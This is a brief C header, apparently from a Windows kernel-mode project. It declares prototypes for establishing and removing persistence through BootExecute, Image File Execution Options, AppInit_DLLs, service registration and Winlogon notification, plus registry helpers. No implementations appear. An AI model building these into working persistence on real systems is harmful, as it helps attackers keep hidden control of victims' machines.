#pragma once

NTSTATUS EstablishPersistence(VOID);
NTSTATUS RemovePersistence(VOID);
BOOLEAN IsPersistenceEstablished(VOID);

// Persistence techniques
NTSTATUS RegisterBootExecute(VOID);
NTSTATUS RegisterImageFileExecution(VOID);
NTSTATUS RegisterAppInitDlls(VOID);
NTSTATUS RegisterService(VOID);
NTSTATUS RegisterWinlogonNotify(VOID);

// Helper functions
NTSTATUS WriteRegistryKey(PUNICODE_STRING KeyPath, PUNICODE_STRING ValueName, PVOID Data, ULONG DataSize, ULONG Type);
NTSTATUS DeleteRegistryKey(PUNICODE_STRING KeyPath, PUNICODE_STRING ValueName);